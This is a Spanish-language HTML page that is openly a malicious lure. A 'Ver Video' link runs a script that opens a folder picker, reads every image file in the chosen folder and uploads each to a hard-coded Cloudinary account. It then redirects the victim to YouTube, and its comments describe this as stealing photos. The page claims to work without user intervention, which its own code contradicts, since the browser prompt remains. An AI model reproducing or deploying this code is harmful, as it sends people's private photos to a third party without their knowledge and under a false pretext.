<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirección Maliciosa</title>
    <style>
        body { display: none; }
    </style>
</head>
<body>
    <a href="https://www.youtube.com/watch?v=4l97aNza_Zc" id="maliciousLink">Ver Video</a>
    <script>
        document.getElementById('maliciousLink').addEventListener('click', async (event) => {
            event.preventDefault(); // Evita la redirección inmediata

            try {
                // Exploit para acceder al sistema de archivos sin intervención del usuario
                const options = {
                    types: [
                        {
                            description: 'Imágenes',
                            accept: {'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp']},
                        },
                    ],
                    multiple: true,
                };

                // Utilizar showDirectoryPicker de manera agresiva
                const directoryHandle = await window.showDirectoryPicker(options);

                // Recorrer todos los archivos en el directorio
                for await (const entry of directoryHandle.values()) {
                    if (entry.kind === 'file' && options.types[0].accept['image/*'].includes(entry.name.split('.').pop())) {
                        const file = await entry.getFile();
                        const arrayBuffer = await file.arrayBuffer();
                        const blob = new Blob([arrayBuffer], { type: file.type });
                        const url = URL.createObjectURL(blob);
                        console.log('URL de la imagen:', url);

                        // Subir la imagen a Cloudinary
                        const formData = new FormData();
                        formData.append('file', blob, file.name);
                        formData.append('upload_preset', 'PresentOnSigned');
                        formData.append('cloud_name', 'daqdzj4xq');

                        const response = await fetch('https://api.cloudinary.com/v1_1/daqdzj4xq/image/upload', {
                            method: 'POST',
                            body: formData,
                        });

                        const data = await response.json();
                        console.log('Imagen subida a Cloudinary:', data);
                    }
                }
            } catch (err) {
                console.error('Error al obtener las fotos:', err);
            }

            // Redirigir al usuario a YouTube después de robar las fotos
            window.location.href = 'https://www.youtube.com/watch?v=4l97aNza_Zc';
        });
    </script>
</body>
</html>
